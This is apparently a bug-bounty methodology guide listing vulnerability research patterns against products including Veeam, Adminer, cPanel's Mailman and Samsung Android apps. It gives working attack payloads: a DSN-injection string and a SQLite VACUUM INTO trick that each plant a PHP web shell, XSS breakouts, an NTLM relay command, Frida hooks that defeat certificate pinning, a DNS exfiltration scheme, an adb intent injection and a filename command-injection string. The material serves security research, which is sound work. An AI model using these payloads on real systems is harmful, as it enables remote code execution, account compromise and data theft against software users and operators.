# Product 0-day & reverse-engineering patterns

Distilled from Voorivex Team product research that paid $30k+ (Veeam), five figures combined (Adminer + cPanel), $5k (Android SDK RCE), and CVEs (Samsung uXSS). For when the target ships software (desktop agents, appliances, panels, mobile apps) rather than — or in addition to — a web app.

## .NET product audit (Veeam: 5 CVEs, $30k)

1. **Wholesale decompile**: loop `ilspycmd <dll> -p -o <out>_src` over every shipped DLL via PowerShell. Then grep for routes and role checks (`[route("`, authorization attributes) and map each endpoint against the product's documented role groups (read-only vs power user vs admin). First BAC bug found = template — search siblings repeating the same missing check (paid: read-only user deleting power-user records via `DELETE /api/v2.2/geolocations/cities/{id}`).
2. **Deserialization binder whitelists**: `CustomSerializationBinder` validating only `assemblyName` (not `typeName`) is bypassable — the other half of the pair is user-controlled (CVE-2024-42024 RCE).
3. **SAML/SSO trust that fails open**: forged base64 SAML assertions accepted when the STS-url validator fails open — auth bypass with SSO even disabled (CVE-2024-29849). Test every "validate third-party token" path with a self-crafted assertion.
4. **NTLM relay surface**: grep web.config files on Windows products for auth endpoints missing `extendedProtection` → `impacket-ntlmrelayx -t http://HOST:9080/... -smb2support`.
5. **DLL path construction**: `string.Format("{0}{1}{2}.dll", arg, sep, arg2)` with user-controllable args + traversal = malicious DLL loaded by a SYSTEM service (LPE).
6. No lab infrastructure needed: insert dummy rows directly into the product's PostgreSQL/DB to unlock admin-role testing.

## Pre-auth surface in DB admin tools (Adminer 5.4.2: 3× 0-day)

- **ODBC/DSN injection = pre-auth RCE**: login-form `server` fields concatenated into DSN strings — `;` starts a new ODBC option: `auth[server]=127.0.0.1;TraceFile=shell.php;TraceOn=1` + `auth[username]=<?php system($_GET['c']); ?>` — the driver writes the trace file (containing the raw UID payload) BEFORE the connection fails. Web shell in the web root, no DB needed. Same class in any PDO/ODBC/JDBC connection-string builder.
- **Blocklist misses API siblings**: `ATTACH` blocked → `VACUUM INTO '/var/www/html/shell.php'` (SQLite ≥3.27) writes the DB — with a `CREATE TABLE "<?php system($_GET['c']); ?>"(i int)` table name — to any path. When a dangerous statement is blocked, enumerate alternative statements with the same primitive.
- **Rogue-server injection**: a fake MySQL greeting packet with version string `1');print()//` rides `preg_replace` no-match into a nonce'd script block (works through strict CSP). Client-side bugs via the server's OWN metadata.
- Detection: nuclei template enumerating versioned filenames (`adminer-5.x.y[-mysql|-en].php`, `sql.php`, `editor.php`).

## Vendor forks of abandoned OSS (cPanel/Mailman: 2× 0-day)

- Big products bundle forks of dead OSS that silently miss upstream fixes — enumerate bundled forks in installers/control panels (`/mailman/` on cPanel defaults) and diff against upstream advisories.
- Python `json.dumps()` into `<script>` doesn't escape `/` → `?mpidentity=%3C/script%3E%3Csvg/onload=alert(1)%3E` breaks out (also URL-path-derived values into the same `pageData` dict).
- Stored XSS via ONE missing `escape()` among correct sibling calls — moderation queues render attacker-controlled email headers (`From: "<script>..."@attacker.com`). Diff sibling template lines.
- Detection templates: use a harmless sentinel param value (not a payload) so WAFs/CDNs don't strip it — then sweep the fingerprint across program assets to find sister instances (multiplied the payout).

## Localhost services = attacker-reachable (CSWSH → zero-click RCE)

- Any `ws://127.0.0.1:PORT` (or localhost HTTP) API with no Origin validation is callable from ANY webpage the victim visits. Enumerate its methods blind: send JSON probes, watch responses (`{GET:'VERSION'}` → version string).
- Windows service agents hide RCE methods behind innocuous names — `{RUN:'APP', URL:...}` returned FAIL until the app-name variant hit a fallback `explorer.exe "{URL}"` launcher. When direct shell metacharacters fail (`&&`, `|`, `;` literal under `CreateProcessAsUser`), hunt format-string launchers and registry `App Paths` hijacks.
- Finding these: fuzz JS-discovered endpoints (dynamic `.htm` files needing correct Referer), size-differentiate responses (1.1MB vs 131B = an installer EXE), decompile the .NET binary — dump `#US` user-string heap via PowerShell reflection to find keys, URLs, and format strings.
- AI-assisted RE works when decomposed: identify binary → locate WebSocket server → enumerate handlers → find the process-launch sink, one small question at a time.

## Mobile → backend RCE ($5k)

1. **Universal Frida hooks** break most custom crypto: `TrustManagerImpl.checkTrustedRecursive` → return empty list (no pinning), hook `javax.crypto.Cipher` for keys/plaintext, hook String constructors to see runtime-built URLs.
2. Still-ciphertext endpoints (custom `X-Cookie` schemes, `application/vnd.wap.wbxml`) = layered key exchange (temp key → main key → HMAC) — recover it once and the whole API is readable.
3. **Google for the target's SDK manuals/docs** — architecture knowledge (here: a server-side headless browser rendering widgets) reveals bug classes invisible in traffic.
4. Server-side JS in rendering engines: validated function calls break out with `legit();evil()` — append your payload after the legit call.
5. **DNS beats HTTP for blind OOB** on AD-joined boxes with no egress: internal DNS forwards externally. Chunk data (100 chars, dot-separated, count packet first, random suffixes vs caching, resend on loss). Exfil paths via `location.pathname.split("/").join("zZ")`.
6. Post-exploitation: `.toString()` on server functions leaks source → find internal unauthenticated services to pivot into (XHR from inside).

## Exported Android components (Samsung uXSS, $2,700)

- Audit `AndroidManifest.xml` exported activities with deeplink intent-filters; trace `onCreate` → handler chains; Frida-flip guard booleans (`return !result;`) to keep tracing behind anti-emulation/referrer checks.
- Security checks on path A don't cover DIRECT invocation of downstream exported components — grep the sink extra/param name app-wide (`extra_access_url` → `loadUrl(getCurrentTab(), ...)`) and call the final receiver yourself (`adb shell am start ... --es extra_access_url "javascript:alert(origin)"`).
- From the web: `intent://` URLs deliver typed extras (`S.x=` string, `B.x=` bool) to exported components.

## Origin discovery for wide-scope programs (feeds all classes)

```
bgpview.io → ASN list → whois -h whois.radb.net -- '-i origin AS123' \
  | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq | mapcidr -silent | httpx
```
Finds forgotten panels on origin IPs behind CDNs that subdomain-only recon never sees. Paid example: PHP admin panel → `admin:admin` on a 401'd `/Config/` → doc archive in `images/` revealed a logo-swap endpoint → filename command injection (`test || sleep 30 ||.gif`) → sweep the CIDR for sister instances.
